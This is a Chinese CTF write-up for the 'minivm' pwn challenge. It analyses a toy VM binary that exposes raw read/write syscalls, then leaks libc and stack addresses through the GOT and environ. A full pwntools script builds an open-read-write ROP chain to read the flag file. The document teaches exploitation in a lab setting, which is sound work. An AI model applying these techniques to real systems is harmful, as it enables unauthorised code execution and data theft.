# minivm

[题目地址](https://ctf.show/challenges#minivm-3835)

因为电脑原因拿不到这个flag。难受。

借用wp的内容，这次的附件linux机子下载不到，没法checksec。

```bash
q@ubuntu:~/Desktop/vm-pwn$ checksec vm
[*] '/home/q/Desktop/vm-pwn/vm'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './glibc-all-in-one/libs/2.27-3ubuntu1_amd64'
q@ubuntu:~/Desktop/vm-pwn$ seccomp-tools dump ./vm
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

没开pie和relro，搞got表？看沙盒，execve被禁了，没法getshell。[沙盒](https://baike.baidu.com/item/%E6%B2%99%E7%9B%92/3769297)简单理解就是能干什么，不能干什么。看程序。

```c
void Main(void)

{
  undefined4 uVar1;
  int local_c;
  
  local_c = (int)DAT_0060a0b0;
  do {
    while (__isoc99_scanf(&format,&DAT_006020a0 + (long)local_c * 8),
          *(long *)(&DAT_006020a0 + (long)local_c * 8) == 999999) {
      DAT_00602080 = '\x01';
      puts("running");
      while (DAT_00602080 != '\0') {
        uVar1 = FUN_004007b7();
        FUN_004007d7(uVar1);
        DAT_0060a0b0 = DAT_0060a0b0 + 1;
      }
    }
    local_c = local_c + 1;
  } while (local_c < 0x65);
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```

一堆DAT，稍微有点抽象。输入点只有一个scanf，format是[%lld](https://blog.csdn.net/hanghang121/article/details/41248249),有符号64位整数。当输入内容等于 999999时，进入下方逻辑。

```c
undefined8 FUN_004007b7(void)

{
  return *(undefined8 *)(&DAT_006020a0 + DAT_0060a0b0 * 8);
}
```

这个函数只是去DAT_006020a0处取值，看ida吧，ghidra里的索引都是这样绕一圈的。还有一个函数。

```c
void FUN_004007d7(undefined4 param_1)

{
  long lVar1;
  long lVar2;
  long lVar3;
  ulong *puVar4;
  undefined8 *puVar5;
  long *plVar6;
  
  switch(param_1) {
  case 0:
    DAT_00602088 = DAT_00602088 + 1;
    DAT_0060a0b0 = DAT_0060a0b0 + 1;
    (&DAT_0060a0c0)[DAT_00602088] = *(undefined8 *)(&DAT_006020a0 + DAT_0060a0b0 * 8);
    break;
  case 1:
    lVar1 = DAT_00602088 + -1;
    puVar5 = &DAT_0060a0c0 + DAT_00602088;
    DAT_00602088 = DAT_00602088 + -1;
    (&DAT_0060a0c0)[DAT_00602088] = (long)((int)*puVar5 + (int)(&DAT_0060a0c0)[lVar1]);
    break;
  case 2:
    puVar4 = &DAT_0060a0c0 + DAT_00602088;
    DAT_00602088 = DAT_00602088 + -1;
    printf("popped %d\n",*puVar4 & 0xffffffff);
    break;
  case 3:
    DAT_00602080 = 0;
    break;
  case 4:
    DAT_00602088 = DAT_00602088 + 1;
    DAT_0060a0b0 = DAT_0060a0b0 + 1;
    (&DAT_0060a0c0)[DAT_00602088] = *(undefined8 *)(&DAT_006020a0 + DAT_0060a0b0 * 8);
    lVar1 = DAT_00602088 + -1;
    plVar6 = &DAT_0060a0c0 + DAT_00602088;
    lVar2 = DAT_00602088 + -2;
    lVar3 = DAT_00602088 + -3;
    DAT_00602088 = DAT_00602088 + -4;
    if (*plVar6 == 0) {
      syscall(0,(&DAT_0060a0c0)[lVar1],(&DAT_0060a0c0)[lVar2],(&DAT_0060a0c0)[lVar3]);
    }
    else if (*plVar6 == 1) {
      syscall(1,(&DAT_0060a0c0)[lVar1],(&DAT_0060a0c0)[lVar2],(&DAT_0060a0c0)[lVar3]);
    }
    break;
  default:
    Main();
  }
  return;
}
```

不行这要捋一下。如果我们的输入不是999999的话，主函数会一直卡在__isoc99_scanf(&format,&DAT_006020a0 + (long)local_c * 8)。ghidra里有点模糊，while循环接收输入和判断全部放在while的条件了，ida里就比较清晰。ghidra的也没错，进入while循环前先看条件，执行scanf，因为是与条件，所以执行完接收输入还会判断等不等于预期值，如果不是break。但是外面还有一个do-while语句，又进到了内层while循环，一直重复，才有不断接收输入的效果。

这么看来DAT_006020a0是我们的指令，local_c也就是DAT_0060a0b0，是输入指令的编号，用作索引。但是要注意循环内部改变local_c不会影响DAT_0060a0b0的值，local_c用作接收输入按顺序放指令，DAT_0060a0b0在FUN_004007b7用来从开头读取指令。现在再看主要逻辑函数就比较清晰了，DAT_0060a0b0 是输入内容的索引，DAT_00602088是运行时虚拟机内存DAT_0060a0c0的索引（说是虚拟机因为按照题目和分析整个程序相当于实现了一个迷你虚拟机）。那case 0的作用就是把我们输入的内容放进DAT_0060a0c0中，压栈操作。

相对的case 2就是弹栈操作，取出当前内存对应索引的值，同时索引减一。prinf也写了“pop”。搞懂几个DAT分析就不难了，case 1是相加操作。case 3终止当前程序的执行，因为main函数里面判断当DAT_00602080为0时就跳出while循环。

重点在case 4。syscall是个好东西，虽然execve被禁了，read和write可没有。0号是read，1号是write，且分析一下发现值全部可控，任意地址读写？有点快乐了。分析参数传入顺序，也就是lVar1，lVar2和lVar3，发现分别为-1，-2和-3。说明lVar3要先传入，lVar1最后传入。最后传入的参数是第一个参数，倒序传参，和32位栈调用一样一样的。掌握传参后write泄露地址不就很简单了吗？

```python
def read(fd,addr,size):
        r.sendline(push)
        
        r.sendline(str(size))
        
        r.sendline(push)
        
        
        r.sendline(str(addr))
        
        
        r.sendline(push)
        
        
        r.sendline(str(fd))
        
        
        r.sendline(call)
        
        
        r.sendline(str(0))
        
        
        r.sendline(hlt)
        
        
        r.sendline(run)
def write(fd,addr,size):
        r.sendline(push)
      
        
        r.sendline(str(size))
        
        
        r.sendline(push)
        
        
        r.sendline(str(addr))
        
        
        r.sendline(push)
        
        
        r.sendline(str(fd))
        
        
        r.sendline(call)
        
        
        r.sendline(str(1))
        
        
        r.sendline(hlt)
        
        
        r.sendline(run)
```

搞puts地址到这里相信大家都会了，接下来干什么呢？学习新姿势——environ，根据大佬所说，这个环境变量打堆题经常用，在IO结构体不想打又条件允许时，直接打environ变量也是不错的选择。这个变量里存储了当前程序的栈地址，一是可以泄露地址构造rop链；二是可以直接把想要执行的语句与栈上的地址进行替换。比如里面存储的下一条指令是if判断，我们直接替换为存储了rop链的地址，程序就会去执行rop链。

开始构建rop链。先用pwntools在libc中搜索pop rdi，rsi和rdx的gadget，方便之后传参。接着把flag字符串存到程序提前开辟好的栈中。

```c
void FUN_00400b99(void)

{
  undefined4 uVar1;
  
  setbuf(stdout,(char *)0x0);
  FUN_00400aa0();
  mmap(&DAT_00123000,0x1000,3,0x22,-1,0);
  _DAT_00123000 = 0x2d2d2d2d2d2d2d2d;
  _DAT_00123008 = 0x2d2d2d2d2d2d2d2d;
  _DAT_00123010 = 0x4f57204f4c4c4548;
  _DAT_00123018 = 0x2d2d2d2d2d444c52;
  _DAT_00123020 = 0x2d2d2d2d2d2d2d2d;
  _DAT_00123028 = 0xa2d2d2d;
  DAT_0012302c = 0;
  while (DAT_00602080 != '\0') {
    uVar1 = FUN_004007b7();
    FUN_004007d7(uVar1);
    DAT_0060a0b0 = DAT_0060a0b0 + 1;
  }
  DAT_00602080 = 1;
  return;
}
```

这个函数没在main函数里看见是因为它是在init里被调用的，做题不要忘了去这些地方看看，说不定藏着东西呢？由此得到程序开辟的栈地址为0x00123000。使用read往这里放入flag字符串，最后是[orw](https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/)泄露flag。


```python
from pwn import *
r=process('./vm')
#r=remote('101.43.94.145',19999)
context.log_level='debug'
context.arch='amd64'
elf=ELF('./vm')
libc=ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')
push=str(0)
hlt=str(3)
call=str(4)
run=str(999999)
def read(fd,addr,size):
        r.sendline(push)
        
        r.sendline(str(size))
        
        r.sendline(push)
        
        
        r.sendline(str(addr))
        
        
        r.sendline(push)
        
        
        r.sendline(str(fd))
        
        
        r.sendline(call)
        
        
        r.sendline(str(0))
        
        
        r.sendline(hlt)
        
        
        r.sendline(run)
def write(fd,addr,size):
        r.sendline(push)
      
        
        r.sendline(str(size))
        
        
        r.sendline(push)
        
        
        r.sendline(str(addr))
        
        
        r.sendline(push)
        
        
        r.sendline(str(fd))
        
        
        r.sendline(call)
        
        
        r.sendline(str(1))
        
        
        r.sendline(hlt)
        
        
        r.sendline(run)
#gdb.attach(r)

write(1,elf.got['puts'],0x10)
leak=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))-libc.sym['puts']
print(hex(leak))
rdi = leak+libc.search(asm("pop rdi\nret")).__next__()
rsi = leak+libc.search(asm("pop rsi\nret")).__next__()
rdx = leak+libc.search(asm("pop rdx\nret")).__next__()
r.recv()
read(0,0x123200,0x10)
r.recv()
r.send("./flag\x00")

opens=leak+libc.sym['open']
readd=leak+libc.sym['read']
writee=leak+libc.sym['write']
environ=leak+libc.sym['environ']

write(1,environ,0x100)
stack=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(stack))
r.recv()
read(0,stack-0x170,0x300)
pay=p64(rdi)+p64(0x123200)+p64(rsi)+p64(2)+p64(opens)
pay+=p64(rdi)+p64(3)+p64(rsi)+p64(0x123200)+p64(rdx)+p64(0x100)+p64(readd)
pay+=p64(rdi)+p64(1)+p64(rsi)+p64(0x123200)+p64(rdx)+p64(0x100)+p64(writee)
r.recv()
r.send(pay)

r.interactive()
```

我没有测试这个脚本，可能不能运行，因为出题人写这个wp时好像不是python3，比如pwntools generator next的使用我是改过的，python2和3不兼容。其他的没看,改了几个bytes，应该可以了。我的flag啊！